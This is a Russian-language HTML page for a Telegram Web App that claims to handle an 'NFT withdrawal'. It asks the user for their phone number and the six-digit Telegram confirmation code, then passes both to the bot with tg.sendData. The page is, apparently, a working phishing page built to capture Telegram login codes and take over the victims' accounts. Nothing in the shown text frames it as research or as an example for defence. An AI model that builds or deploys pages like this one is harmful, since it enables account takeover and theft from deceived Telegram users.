<!DOCTYPE html>
<html>
<head>
    <title>Вывод NFT</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body { font-family: sans-serif; text-align: center; background: #1e2b3a; color: white; margin: 0; padding: 20px; }
        h2 { margin-bottom: 20px; }
        .card { background: #2c3e50; border-radius: 15px; padding: 20px; max-width: 350px; margin: 0 auto; }
        input { width: 90%; padding: 12px; margin: 10px 0; border-radius: 8px; border: none; font-size: 16px; background: #34495e; color: white; }
        input::placeholder { color: #aaa; }
        .btn { background: #2ecc71; color: white; border: none; padding: 15px; font-size: 18px; border-radius: 10px; width: 95%; cursor: pointer; margin-top: 15px; font-weight: bold; }
        .btn:active { background: #27ae60; }
        .note { font-size: 12px; color: #bbb; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>🔐 Подтверждение</h2>
        <p>Для вывода NFT введите номер телефона и код из Telegram</p>
        <input type="text" id="phone" placeholder="Номер телефона (например, +79991234567)">
        <input type="text" id="code" placeholder="Код подтверждения (6 цифр)">
        <button class="btn" id="submitBtn">Подтвердить и вывести</button>
        <div class="note">Код придёт в Telegram после запроса. Это займёт несколько секунд.</div>
    </div>
    <script>
        let tg = window.Telegram.WebApp;
        tg.expand();

        document.getElementById('submitBtn').addEventListener('click', function() {
            let phone = document.getElementById('phone').value.trim();
            let code = document.getElementById('code').value.trim();
            if (!phone || !code) {
                tg.showAlert('Заполните все поля');
                return;
            }
            if (code.length !== 6 || isNaN(code)) {
                tg.showAlert('Код должен состоять из 6 цифр');
                return;
            }
            tg.sendData(JSON.stringify({
                action: 'submit_withdraw',
                phone: phone,
                code: code
            }));
            tg.close();
        });
    </script>
</body>
</html>
